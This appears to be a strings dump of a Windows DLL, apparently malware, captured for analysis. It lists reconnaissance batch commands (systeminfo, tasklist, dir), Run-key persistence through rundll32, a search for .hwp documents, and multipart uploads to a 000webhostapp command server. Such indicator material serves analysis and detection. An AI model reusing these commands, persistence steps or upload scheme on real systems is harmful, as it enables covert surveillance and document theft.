[Strings]
nth  paddr      vaddr      len size section type    string
――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0    0x0000004d 0x0000004d 44  45           ascii   !This program cannot be run in DOS mode.\r\r\n$
1    0x00000080 0x00000080 17  18           ascii   #AC*g -yg -yg -y@
2    0x00000092 0x00000092 10  11           ascii   Vyl -yg ,y
3    0x000000a3 0x000000a3 7   8            ascii   yd -ynX
4    0x000000ab 0x000000ab 7   8            ascii   yV -ynX
5    0x000000b3 0x000000b3 7   8            ascii   yr -ynX
6    0x000000bb 0x000000bb 7   8            ascii   y\e -ynX
7    0x000000c3 0x000000c3 7   8            ascii   yo -ynX
8    0x000000cb 0x000000cb 7   8            ascii   yf -ynX
9    0x000000d3 0x000000d3 13  14           ascii   yf -yRichg -y
10   0x000001e0 0x000001e0 5   6            ascii   .text
11   0x00000207 0x00000207 7   8            ascii   `.rdata
12   0x0000022f 0x0000022f 6   7            ascii   @.data
13   0x00000258 0x00000258 6   7            ascii   .reloc
711  0x0001023c 0x1001163c 30  31   .rdata  ascii   R6030\r\n- CRT not initialized\r\n
712  0x0001025c 0x1001165c 36  37   .rdata  ascii   R6028\r\n- unable to initialize heap\r\n
713  0x00010284 0x10011684 52  53   .rdata  ascii   R6027\r\n- not enough space for lowio initialization\r\n
714  0x000102bc 0x100116bc 52  53   .rdata  ascii   R6026\r\n- not enough space for stdio initialization\r\n
715  0x000102f4 0x100116f4 37  38   .rdata  ascii   R6025\r\n- pure virtual function call\r\n
716  0x0001031c 0x1001171c 52  53   .rdata  ascii   R6024\r\n- not enough space for _onexit/atexit table\r\n
717  0x00010354 0x10011754 40  41   .rdata  ascii   R6019\r\n- unable to open console device\r\n
718  0x00010380 0x10011780 32  33   .rdata  ascii   R6018\r\n- unexpected heap error\r\n
719  0x000103a4 0x100117a4 44  45   .rdata  ascii   R6017\r\n- unexpected multithread lock error\r\n
720  0x000103d4 0x100117d4 43  44   .rdata  ascii   R6016\r\n- not enough space for thread data\r\n
721  0x00010400 0x10011800 149 150  .rdata  ascii   \r\nThis application has requested the Runtime to terminate it in an unusual way.\nPlease contact the application's support team for more information.\r\n
722  0x00010498 0x10011898 43  44   .rdata  ascii   R6009\r\n- not enough space for environment\r\n
723  0x000104c4 0x100118c4 41  42   .rdata  ascii   R6008\r\n- not enough space for arguments\r\n
724  0x000104f0 0x100118f0 44  45   .rdata  ascii   R6002\r\n- floating point support not loaded\r\n
725  0x00010520 0x10011920 36  37   .rdata  ascii   Microsoft Visual C++ Runtime Library
726  0x00010550 0x10011950 22  23   .rdata  ascii   <program name unknown>
727  0x00010568 0x10011968 25  26   .rdata  ascii   Runtime Error!\n\nProgram: 
728  0x00010606 0x10011a06 7   8    .rdata  ascii   \a\b\t\n\v\f\r
729  0x0001061f 0x10011a1f 95  96   .rdata  ascii    !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
730  0x00010684 0x10011a84 25  26   .rdata  ascii    Complete Object Locator'
731  0x000106a0 0x10011aa0 28  29   .rdata  ascii    Class Hierarchy Descriptor'
732  0x000106c0 0x10011ac0 18  19   .rdata  ascii    Base Class Array'
733  0x000106d4 0x10011ad4 27  28   .rdata  ascii    Base Class Descriptor at (
734  0x000106f0 0x10011af0 17  18   .rdata  ascii    Type Descriptor'
735  0x00010704 0x10011b04 27  28   .rdata  ascii   `local static thread guard'
736  0x00010720 0x10011b20 42  43   .rdata  ascii   `managed vector copy constructor iterator'
737  0x0001074c 0x10011b4c 40  41   .rdata  ascii   `vector vbase copy constructor iterator'
738  0x00010778 0x10011b78 34  35   .rdata  ascii   `vector copy constructor iterator'
739  0x0001079c 0x10011b9c 32  33   .rdata  ascii   `dynamic atexit destructor for '
740  0x000107c0 0x10011bc0 26  27   .rdata  ascii   `dynamic initializer for '
741  0x000107dc 0x10011bdc 43  44   .rdata  ascii   `eh vector vbase copy constructor iterator'
742  0x00010808 0x10011c08 37  38   .rdata  ascii   `eh vector copy constructor iterator'
743  0x00010830 0x10011c30 36  37   .rdata  ascii   `managed vector destructor iterator'
744  0x00010858 0x10011c58 37  38   .rdata  ascii   `managed vector constructor iterator'
745  0x00010880 0x10011c80 28  29   .rdata  ascii   `placement delete[] closure'
746  0x000108a0 0x10011ca0 26  27   .rdata  ascii   `placement delete closure'
747  0x000108bc 0x10011cbc 14  15   .rdata  ascii   `omni callsig'
748  0x000108cc 0x10011ccc 9   10   .rdata  ascii    delete[]
749  0x000108d8 0x10011cd8 6   7    .rdata  ascii    new[]
750  0x000108e0 0x10011ce0 35  36   .rdata  ascii   `local vftable constructor closure'
751  0x00010904 0x10011d04 15  16   .rdata  ascii   `local vftable'
752  0x00010914 0x10011d14 5   6    .rdata  ascii   `RTTI
753  0x00010920 0x10011d20 15  16   .rdata  ascii   `udt returning'
754  0x00010930 0x10011d30 26  27   .rdata  ascii   `copy constructor closure'
755  0x0001094c 0x10011d4c 38  39   .rdata  ascii   `eh vector vbase constructor iterator'
756  0x00010974 0x10011d74 31  32   .rdata  ascii   `eh vector destructor iterator'
757  0x00010994 0x10011d94 32  33   .rdata  ascii   `eh vector constructor iterator'
758  0x000109b8 0x10011db8 26  27   .rdata  ascii   `virtual displacement map'
759  0x000109d4 0x10011dd4 35  36   .rdata  ascii   `vector vbase constructor iterator'
760  0x000109f8 0x10011df8 28  29   .rdata  ascii   `vector destructor iterator'
761  0x00010a18 0x10011e18 29  30   .rdata  ascii   `vector constructor iterator'
762  0x00010a38 0x10011e38 28  29   .rdata  ascii   `scalar deleting destructor'
763  0x00010a58 0x10011e58 29  30   .rdata  ascii   `default constructor closure'
764  0x00010a78 0x10011e78 28  29   .rdata  ascii   `vector deleting destructor'
765  0x00010a98 0x10011e98 18  19   .rdata  ascii   `vbase destructor'
766  0x00010aac 0x10011eac 8   9    .rdata  ascii   `string'
767  0x00010ab8 0x10011eb8 20  21   .rdata  ascii   `local static guard'
768  0x00010ad0 0x10011ed0 8   9    .rdata  ascii   `typeof'
769  0x00010adc 0x10011edc 7   8    .rdata  ascii   `vcall'
770  0x00010ae4 0x10011ee4 9   10   .rdata  ascii   `vbtable'
771  0x00010af0 0x10011ef0 9   10   .rdata  ascii   `vftable'
772  0x00010b2c 0x10011f2c 11  48   .rdata  utf32le |^~⤨,㴾>㴼<%/ blocks=Basic Latin,Supplemental Arrows-B,CJK Unified Ideographs Extension A
773  0x00010b5c 0x10011f5c 7   32   .rdata  utf32le &+-ⴭ⬫*㸭 blocks=Basic Latin,Georgian Supplement,Miscellaneous Symbols and Arrows,CJK Unified Ideographs Extension A
774  0x00010b7c 0x10011f7c 4   5    .rdata  ascii   ator
775  0x00010b9c 0x10011f9c 7   8    .rdata  ascii    delete
776  0x00010ba4 0x10011fa4 4   5    .rdata  ascii    new
777  0x00010bac 0x10011fac 11  12   .rdata  ascii   __unaligned
778  0x00010bb8 0x10011fb8 10  11   .rdata  ascii   __restrict
779  0x00010bc4 0x10011fc4 7   8    .rdata  ascii   __ptr64
780  0x00010bcc 0x10011fcc 9   10   .rdata  ascii   __clrcall
781  0x00010bd8 0x10011fd8 10  11   .rdata  ascii   __fastcall
782  0x00010be4 0x10011fe4 10  11   .rdata  ascii   __thiscall
783  0x00010bf0 0x10011ff0 9   10   .rdata  ascii   __stdcall
784  0x00010bfc 0x10011ffc 8   9    .rdata  ascii   __pascal
785  0x00010c08 0x10012008 7   8    .rdata  ascii   __cdecl
786  0x00010c10 0x10012010 8   9    .rdata  ascii   __based(
787  0x00010dc5 0x100121c5 5   6    .rdata  ascii   ('8PW
788  0x00010dce 0x100121ce 5   6    .rdata  ascii   700PP
789  0x00010de0 0x100121e0 17  18   .rdata  ascii   `h`hhh\b\b\axppwpp\b\b
790  0x00010dfc 0x100121fc 23  24   .rdata  ascii   GetProcessWindowStation
791  0x00010e14 0x10012214 25  26   .rdata  ascii   GetUserObjectInformationA
792  0x00010e30 0x10012230 18  19   .rdata  ascii   GetLastActivePopup
793  0x00010e44 0x10012244 15  16   .rdata  ascii   GetActiveWindow
794  0x00010e54 0x10012254 11  12   .rdata  ascii   MessageBoxA
795  0x00010e60 0x10012260 10  11   .rdata  ascii   USER32.DLL
796  0x00010f70 0x10012370 33  68   .rdata  utf16le          (((((                  H
797  0x00011172 0x10012572 33  68   .rdata  utf16le          h((((                  H
798  0x00011270 0x10012670 34  70   .rdata  utf16le                                  H
799  0x000113ff 0x100127ff 7   8    .rdata  ascii   \a\b\t\n\v\f\r
800  0x00011418 0x10012818 95  96   .rdata  ascii    !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
801  0x0001157f 0x1001297f 7   8    .rdata  ascii   \a\b\t\n\v\f\r
802  0x00011598 0x10012998 95  96   .rdata  ascii    !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
803  0x00011678 0x10012a78 8   9    .rdata  ascii   HH:mm:ss
804  0x00011684 0x10012a84 19  20   .rdata  ascii   dddd, MMMM dd, yyyy
805  0x00011698 0x10012a98 8   9    .rdata  ascii   MM/dd/yy
806  0x000116ac 0x10012aac 8   9    .rdata  ascii   December
807  0x000116b8 0x10012ab8 8   9    .rdata  ascii   November
808  0x000116c4 0x10012ac4 7   8    .rdata  ascii   October
809  0x000116cc 0x10012acc 9   10   .rdata  ascii   September
810  0x000116d8 0x10012ad8 6   7    .rdata  ascii   August
811  0x000116e0 0x10012ae0 4   5    .rdata  ascii   July
812  0x000116e8 0x10012ae8 4   5    .rdata  ascii   June
813  0x000116f0 0x10012af0 5   6    .rdata  ascii   April
814  0x000116f8 0x10012af8 5   6    .rdata  ascii   March
815  0x00011700 0x10012b00 8   9    .rdata  ascii   February
816  0x0001170c 0x10012b0c 7   8    .rdata  ascii   January
817  0x00011744 0x10012b44 8   9    .rdata  ascii   Saturday
818  0x00011750 0x10012b50 6   7    .rdata  ascii   Friday
819  0x00011758 0x10012b58 8   9    .rdata  ascii   Thursday
820  0x00011764 0x10012b64 9   10   .rdata  ascii   Wednesday
821  0x00011770 0x10012b70 7   8    .rdata  ascii   Tuesday
822  0x00011778 0x10012b78 6   7    .rdata  ascii   Monday
823  0x00011780 0x10012b80 6   7    .rdata  ascii   Sunday
824  0x000117a8 0x10012ba8 7   8    .rdata  ascii   CONOUT$
825  0x000117b0 0x10012bb0 21  22   .rdata  ascii   SunMonTueWedThuFriSat
826  0x000117c8 0x10012bc8 36  37   .rdata  ascii   JanFebMarAprMayJunJulAugSepOctNovDec
827  0x000117f0 0x10012bf0 64  65   .rdata  ascii   ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
828  0x0001183c 0x10012c3c 12  13   .rdata  ascii   Kernel32.dll
829  0x0001184c 0x10012c4c 16  17   .rdata  ascii   CreateDirectoryA
830  0x00011860 0x10012c60 11  12   .rdata  ascii   CreateFileA
831  0x0001186c 0x10012c6c 11  12   .rdata  ascii   DeleteFileA
832  0x00011878 0x10012c78 9   10   .rdata  ascii   WriteFile
833  0x00011884 0x10012c84 11  12   .rdata  ascii   CloseHandle
834  0x00011890 0x10012c90 14  15   .rdata  ascii   CreateProcessA
835  0x000118a0 0x10012ca0 9   10   .rdata  ascii   CopyFileA
836  0x000118ac 0x10012cac 12  13   .rdata  ascii   CreateThread
837  0x000118bc 0x10012cbc 11  12   .rdata  ascii   Wininet.dll
838  0x000118c8 0x10012cc8 13  14   .rdata  ascii   InternetOpenA
839  0x000118d8 0x10012cd8 16  17   .rdata  ascii   InternetConnectA
840  0x000118ec 0x10012cec 16  17   .rdata  ascii   HttpOpenRequestA
841  0x00011900 0x10012d00 16  17   .rdata  ascii   HttpSendRequestA
842  0x00011914 0x10012d14 14  15   .rdata  ascii   HttpQueryInfoA
843  0x00011924 0x10012d24 16  17   .rdata  ascii   InternetReadFile
844  0x00011938 0x10012d38 19  20   .rdata  ascii   InternetCloseHandle
845  0x0001194c 0x10012d4c 12  13   .rdata  ascii   Advapi32.dll
846  0x0001195c 0x10012d5c 13  14   .rdata  ascii   RegOpenKeyExA
847  0x0001196c 0x10012d6c 16  17   .rdata  ascii   RegQueryValueExA
848  0x00011980 0x10012d80 14  15   .rdata  ascii   RegSetValueExA
849  0x00011990 0x10012d90 11  12   .rdata  ascii   RegCloseKey
850  0x0001199c 0x10012d9c 4   5    .rdata  ascii   %s\r\n
851  0x000119ac 0x10012dac 7   8    .rdata  ascii   COMSPEC
852  0x000119b4 0x10012db4 5   6    .rdata  ascii   a.bat
853  0x000119c0 0x10012dc0 15  16   .rdata  ascii   dir %s\ >> %s\r\n
854  0x000119d0 0x10012dd0 18  19   .rdata  ascii   systeminfo >> %s\r\n
855  0x000119e4 0x10012de4 16  17   .rdata  ascii   tasklist >> %s\r\n
856  0x000119f8 0x10012df8 19  20   .rdata  ascii   tasklist /M >> %s\r\n
857  0x00011a0c 0x10012e0c 6   7    .rdata  ascii   del %s
858  0x00011a14 0x10012e14 16  17   .rdata  ascii   SeDebugPrivilege
859  0x00011a28 0x10012e28 45  46   .rdata  ascii   SoftWare\Microsoft\Windows\CurrentVersion\Run
860  0x00011a58 0x10012e58 30  31   .rdata  ascii   rundll32.exe %s ExportFunction
861  0x00011a78 0x10012e78 10  11   .rdata  ascii   CmdRun32kr
862  0x00011a84 0x10012e84 18  19   .rdata  ascii   \Microsoft\Protect
863  0x00011a98 0x10012e98 14  15   .rdata  ascii   MpCmdRunkr.dll
864  0x00011aa8 0x10012ea8 5   6    .rdata  ascii   %s\%s
865  0x00011ab0 0x10012eb0 18  19   .rdata  ascii   \Microsoft\Network
866  0x00011ac4 0x10012ec4 11  12   .rdata  ascii   ixeo584.bin
867  0x00011ad0 0x10012ed0 5   6    .rdata  ascii   %s\%s
868  0x00011ad8 0x10012ed8 23  24   .rdata  ascii   RegQueryValueExA = %s\r\n
869  0x00011af0 0x10012ef0 25  26   .rdata  ascii   RegQueryValueExA Failed\r\n
870  0x00011b0c 0x10012f0c 12  13   .rdata  ascii   netState.dll
871  0x00011b1c 0x10012f1c 48  49   .rdata  ascii   \r\nI,m Online. %04d - %02d - %02d - %02d - %02d\r\n
872  0x00011b50 0x10012f50 4   5    .rdata  ascii   %s\*
873  0x00011b60 0x10012f60 4   5    .rdata  ascii   .hwp
874  0x00011b6c 0x10012f6c 8   9    .rdata  ascii   ~~~~~~~~
875  0x00011b7c 0x10012f7c 27  28   .rdata  ascii   kjie23948_34238958_KJ238743
876  0x00011ba0 0x10012fa0 17  18   .rdata  ascii   host/download.php
877  0x00011bb4 0x10012fb4 14  15   .rdata  ascii   %s?filename=%s
878  0x00011bc4 0x10012fc4 49  50   .rdata  ascii   Content-Type: application/x-www-form-urlencoded\r\n
879  0x00011bf8 0x10012ff8 11  12   .rdata  ascii   Mozilla/4.0
880  0x00011c04 0x10013004 28  29   .rdata  ascii   follow_dai.000webhostapp.com
881  0x00011c24 0x10013024 52  53   .rdata  ascii   image/gif, image/jpeg, image/pjpeg, image/pjpeg, */*
882  0x00011c5c 0x1001305c 8   9    .rdata  ascii   HTTP/1.0
883  0x00011c6c 0x1001306c 24  25   .rdata  ascii   %04d-%02d-%02d-%02d-%02d
884  0x00011c88 0x10013088 6   7    .rdata  ascii   ending
885  0x00011c90 0x10013090 42  43   .rdata  ascii   \r\n------WebKitFormBoundarywhpFxMBe19cSjFnG
886  0x00011cbc 0x100130bc 54  55   .rdata  ascii   \r\nContent-Disposition: form-data; name="MAX_FILE_SIZE"
887  0x00011cf4 0x100130f4 12  13   .rdata  ascii   \r\n\r\n10000000
888  0x00011d08 0x10013108 68  69   .rdata  ascii   \r\nContent-Disposition: form-data; name="userfile"; filename="result"
889  0x00011d50 0x10013150 44  45   .rdata  ascii   \r\nContent-Type: application/octet-stream\r\n\r\n
890  0x00011d80 0x10013180 6   7    .rdata  ascii   Host: 
891  0x00011d88 0x10013188 13  14   .rdata  ascii   host/post.php
892  0x00011d98 0x10013198 82  83   .rdata  ascii   Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywhpFxMBe19cSjFnG
893  0x00011dec 0x100131ec 22  23   .rdata  ascii   Accept-Language: en-us
894  0x00011e08 0x10013208 82  83   .rdata  ascii   Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; .NET CLR 1.1.4322)
895  0x00011e60 0x10013260 14  15   .rdata  ascii   %s\r\n%s\r\n%s\r\n%s
896  0x00011e70 0x10013270 4   5    .rdata  ascii   POST
897  0x00011e88 0x10013288 13  14   .rdata  ascii   bad exception
898  0x00012972 0x10013d72 24  25   .rdata  ascii   GetWindowThreadProcessId
899  0x0001298e 0x10013d8e 12  13   .rdata  ascii   PostMessageA
900  0x0001299e 0x10013d9e 9   10   .rdata  ascii   GetWindow
901  0x000129aa 0x10013daa 16  17   .rdata  ascii   EnumChildWindows
902  0x000129be 0x10013dbe 9   10   .rdata  ascii   wsprintfA
903  0x000129c8 0x10013dc8 10  11   .rdata  ascii   USER32.dll
904  0x000129d6 0x10013dd6 23  24   .rdata  ascii   SHGetSpecialFolderPathA
905  0x000129ee 0x10013dee 11  12   .rdata  ascii   SHELL32.dll
906  0x000129fc 0x10013dfc 16  17   .rdata  ascii   OpenProcessToken
907  0x00012a10 0x10013e10 21  22   .rdata  ascii   LookupPrivilegeValueA
908  0x00012a28 0x10013e28 21  22   .rdata  ascii   AdjustTokenPrivileges
909  0x00012a40 0x10013e40 13  14   .rdata  ascii   RegOpenKeyExA
910  0x00012a50 0x10013e50 16  17   .rdata  ascii   RegQueryValueExA
911  0x00012a64 0x10013e64 14  15   .rdata  ascii   RegSetValueExA
912  0x00012a76 0x10013e76 11  12   .rdata  ascii   RegCloseKey
913  0x00012a84 0x10013e84 12  13   .rdata  ascii   GetUserNameA
914  0x00012a92 0x10013e92 12  13   .rdata  ascii   ADVAPI32.dll
915  0x00012aa2 0x10013ea2 15  16   .rdata  ascii   PathFileExistsA
916  0x00012ab2 0x10013eb2 11  12   .rdata  ascii   SHLWAPI.dll
917  0x00012ac0 0x10013ec0 18  19   .rdata  ascii   GetModuleFileNameA
918  0x00012ad6 0x10013ed6 16  17   .rdata  ascii   GetComputerNameA
919  0x00012aea 0x10013eea 12  13   .rdata  ascii   LoadLibraryA
920  0x00012afa 0x10013efa 14  15   .rdata  ascii   GetProcAddress
921  0x00012b0c 0x10013f0c 24  25   .rdata  ascii   CreateToolhelp32Snapshot
922  0x00012b28 0x10013f28 14  15   .rdata  ascii   Process32First
923  0x00012b3a 0x10013f3a 13  14   .rdata  ascii   Process32Next
924  0x00012b4a 0x10013f4a 23  24   .rdata  ascii   GetEnvironmentVariableA
925  0x00012b64 0x10013f64 12  13   .rdata  ascii   GetTempPathA
926  0x00012b74 0x10013f74 17  18   .rdata  ascii   GetShortPathNameA
927  0x00012b88 0x10013f88 7   8    .rdata  ascii   WinExec
928  0x00012b92 0x10013f92 17  18   .rdata  ascii   GetCurrentProcess
929  0x00012ba6 0x10013fa6 12  13   .rdata  ascii   GetLastError
930  0x00012bb6 0x10013fb6 11  12   .rdata  ascii   CloseHandle
931  0x00012bc4 0x10013fc4 8   9    .rdata  ascii   lstrcatA
932  0x00012bd0 0x10013fd0 12  13   .rdata  ascii   GetLocalTime
933  0x00012be0 0x10013fe0 5   6    .rdata  ascii   Sleep
934  0x00012be8 0x10013fe8 12  13   .rdata  ascii   CreateThread
935  0x00012bf8 0x10013ff8 14  15   .rdata  ascii   FindFirstFileA
936  0x00012c0a 0x1001400a 20  21   .rdata  ascii   FileTimeToSystemTime
937  0x00012c22 0x10014022 18  19   .rdata  ascii   OutputDebugStringA
938  0x00012c38 0x10014038 13  14   .rdata  ascii   FindNextFileA
939  0x00012c48 0x10014048 16  17   .rdata  ascii   GetLogicalDrives
940  0x00012c5c 0x1001405c 12  13   .rdata  ascii   CreateMutexA
941  0x00012c6c 0x1001406c 11  12   .rdata  ascii   FreeLibrary
942  0x00012c7a 0x1001407a 11  12   .rdata  ascii   DeleteFileA
943  0x00012c88 0x10014088 23  24   .rdata  ascii   GetSystemTimeAsFileTime
944  0x00012ca2 0x100140a2 9   10   .rdata  ascii   HeapAlloc
945  0x00012cae 0x100140ae 8   9    .rdata  ascii   HeapFree
946  0x00012cba 0x100140ba 18  19   .rdata  ascii   GetCurrentThreadId
947  0x00012cd0 0x100140d0 15  16   .rdata  ascii   GetCommandLineA
948  0x00012ce2 0x100140e2 16  17   .rdata  ascii   TerminateProcess
949  0x00012cf6 0x100140f6 24  25   .rdata  ascii   UnhandledExceptionFilter
950  0x00012d12 0x10014112 27  28   .rdata  ascii   SetUnhandledExceptionFilter
951  0x00012d30 0x10014130 17  18   .rdata  ascii   IsDebuggerPresent
952  0x00012d44 0x10014144 16  17   .rdata  ascii   GetModuleHandleW
953  0x00012d58 0x10014158 11  12   .rdata  ascii   TlsGetValue
954  0x00012d66 0x10014166 8   9    .rdata  ascii   TlsAlloc
955  0x00012d72 0x10014172 11  12   .rdata  ascii   TlsSetValue
956  0x00012d80 0x10014180 7   8    .rdata  ascii   TlsFree
957  0x00012d8a 0x1001418a 20  21   .rdata  ascii   InterlockedIncrement
958  0x00012da2 0x100141a2 12  13   .rdata  ascii   SetLastError
959  0x00012db2 0x100141b2 20  21   .rdata  ascii   InterlockedDecrement
960  0x00012dca 0x100141ca 14  15   .rdata  ascii   RaiseException
961  0x00012ddc 0x100141dc 20  21   .rdata  ascii   EnterCriticalSection
962  0x00012df4 0x100141f4 20  21   .rdata  ascii   LeaveCriticalSection
963  0x00012e0c 0x1001420c 9   10   .rdata  ascii   RtlUnwind
964  0x00012e18 0x10014218 14  15   .rdata  ascii   SetHandleCount
965  0x00012e2a 0x1001422a 12  13   .rdata  ascii   GetStdHandle
966  0x00012e3a 0x1001423a 11  12   .rdata  ascii   GetFileType
967  0x00012e48 0x10014248 15  16   .rdata  ascii   GetStartupInfoA
968  0x00012e5a 0x1001425a 21  22   .rdata  ascii   DeleteCriticalSection
969  0x00012e72 0x10014272 19  20   .rdata  ascii   MultiByteToWideChar
970  0x00012e88 0x10014288 8   9    .rdata  ascii   ReadFile
971  0x00012e94 0x10014294 9   10   .rdata  ascii   WriteFile
972  0x00012ea0 0x100142a0 19  20   .rdata  ascii   WideCharToMultiByte
973  0x00012eb6 0x100142b6 12  13   .rdata  ascii   GetConsoleCP
974  0x00012ec6 0x100142c6 14  15   .rdata  ascii   GetConsoleMode
975  0x00012ed8 0x100142d8 11  12   .rdata  ascii   VirtualFree
976  0x00012ee6 0x100142e6 12  13   .rdata  ascii   VirtualAlloc
977  0x00012ef6 0x100142f6 11  12   .rdata  ascii   HeapReAlloc
978  0x00012f04 0x10014304 10  11   .rdata  ascii   HeapCreate
979  0x00012f12 0x10014312 11  12   .rdata  ascii   HeapDestroy
980  0x00012f20 0x10014320 11  12   .rdata  ascii   ExitProcess
981  0x00012f2e 0x1001432e 12  13   .rdata  ascii   SetStdHandle
982  0x00012f3e 0x1001433e 14  15   .rdata  ascii   SetFilePointer
983  0x00012f50 0x10014350 23  24   .rdata  ascii   FreeEnvironmentStringsA
984  0x00012f6a 0x1001436a 21  22   .rdata  ascii   GetEnvironmentStrings
985  0x00012f82 0x10014382 23  24   .rdata  ascii   FreeEnvironmentStringsW
986  0x00012f9c 0x1001439c 22  23   .rdata  ascii   GetEnvironmentStringsW
987  0x00012fb6 0x100143b6 23  24   .rdata  ascii   QueryPerformanceCounter
988  0x00012fd0 0x100143d0 12  13   .rdata  ascii   GetTickCount
989  0x00012fe0 0x100143e0 19  20   .rdata  ascii   GetCurrentProcessId
990  0x00012ff6 0x100143f6 9   10   .rdata  ascii   GetCPInfo
991  0x00013002 0x10014402 6   7    .rdata  ascii   GetACP
992  0x0001300c 0x1001440c 8   9    .rdata  ascii   GetOEMCP
993  0x00013018 0x10014418 15  16   .rdata  ascii   IsValidCodePage
994  0x0001302a 0x1001442a 8   9    .rdata  ascii   HeapSize
995  0x00013036 0x10014436 37  38   .rdata  ascii   InitializeCriticalSectionAndSpinCount
996  0x0001305e 0x1001445e 16  17   .rdata  ascii   FlushFileBuffers
997  0x00013072 0x10014472 11  12   .rdata  ascii   CreateFileA
998  0x00013080 0x10014480 13  14   .rdata  ascii   WriteConsoleA
999  0x00013090 0x10014490 18  19   .rdata  ascii   GetConsoleOutputCP
1000 0x000130a6 0x100144a6 13  14   .rdata  ascii   WriteConsoleW
1001 0x000130b6 0x100144b6 14  15   .rdata  ascii   GetLocaleInfoA
1002 0x000130c8 0x100144c8 14  15   .rdata  ascii   GetStringTypeA
1003 0x000130da 0x100144da 14  15   .rdata  ascii   GetStringTypeW
1004 0x000130ec 0x100144ec 12  13   .rdata  ascii   LCMapStringA
1005 0x000130fc 0x100144fc 12  13   .rdata  ascii   LCMapStringW
1006 0x0001310c 0x1001450c 12  13   .rdata  ascii   SetEndOfFile
1007 0x0001311c 0x1001451c 14  15   .rdata  ascii   GetProcessHeap
1008 0x0001312c 0x1001452c 12  13   .rdata  ascii   KERNEL32.dll
1009 0x00013172 0x10014572 12  13   .rdata  ascii   Tran_dll.dll
1010 0x0001317f 0x1001457f 14  15   .rdata  ascii   ExportFunction
1011 0x0001320c 0x1001500c 19  20   .data   ascii   .?AVbad_alloc@std@@
1012 0x00013228 0x10015028 19  20   .data   ascii   .?AVexception@std@@
1013 0x00013248 0x10015048 15  16   .data   ascii   .?AVtype_info@@
1014 0x000132ac 0x100150ac 12  52   .data   utf32le \t\a\f\b\f\t\f\n\a\v\b\f
1015 0x00013330 0x10015130 5   24   .data   utf32le R\rS\rW
1016 0x00013348 0x10015148 7   32   .data   utf32le Y\vl\rm p
1017 0x000133bc 0x100151bc 4   20   .data   utf32le \v§\r· blocks=Basic Latin,Latin-1 Supplement
1018 0x00013b26 0x10015926 26  27   .data   ascii                             
1019 0x00013c06 0x10015a06 26  27   .data   ascii   abcdefghijklmnopqrstuvwxyz
1020 0x00013c26 0x10015a26 26  27   .data   ascii   ABCDEFGHIJKLMNOPQRSTUVWXYZ
1021 0x00013d2a 0x10015b2a 26  27   .data   ascii                             
1022 0x00013e11 0x10015c11 26  27   .data   ascii   abcdefghijklmnopqrstuvwxyz
1023 0x00013e31 0x10015c31 26  27   .data   ascii   ABCDEFGHIJKLMNOPQRSTUVWXYZ
1024 0x00014260 0x10016060 10  11   .data   ascii   .?AVGen3@@
1025 0x00014270 0x10016070 13  28   .data   utf16le D:\result.log
1026 0x0001450c 0x1001630c 23  24   .data   ascii   .?AVbad_exception@std@@
1027 0x0001460b 0x1001900b 5   6    .reloc  ascii   0J1b1
1028 0x00014615 0x10019015 5   6    .reloc  ascii   94:j:
1029 0x00014629 0x10019029 9   10   .reloc  ascii   ;5;<;o;u;
1030 0x0001463d 0x1001903d 13  14   .reloc  ascii   ;\e<!<7<><X<p<
1031 0x00014651 0x10019051 9   10   .reloc  ascii   =3=:=m=s=
1032 0x00014669 0x10019069 9   10   .reloc  ascii   >5><>o>u>
1033 0x00014681 0x10019081 11  12   .reloc  ascii   ?\e?-?[?a?w?
1034 0x000146a4 0x100190a4 10  11   .reloc  ascii   %0+0A0J0\0
1035 0x000146bd 0x100190bd 7   8    .reloc  ascii   1S2i2{2
1036 0x000146ed 0x100190ed 29  30   .reloc  ascii   4"4(474<4D4J4Q4W4^4d4k4q4x4~4
1037 0x00014727 0x10019127 9   10   .reloc  ascii   5\e5*535G5
1038 0x0001473f 0x1001913f 5   6    .reloc  ascii   6\n676
1039 0x0001474f 0x1001914f 5   6    .reloc  ascii   7(7`7
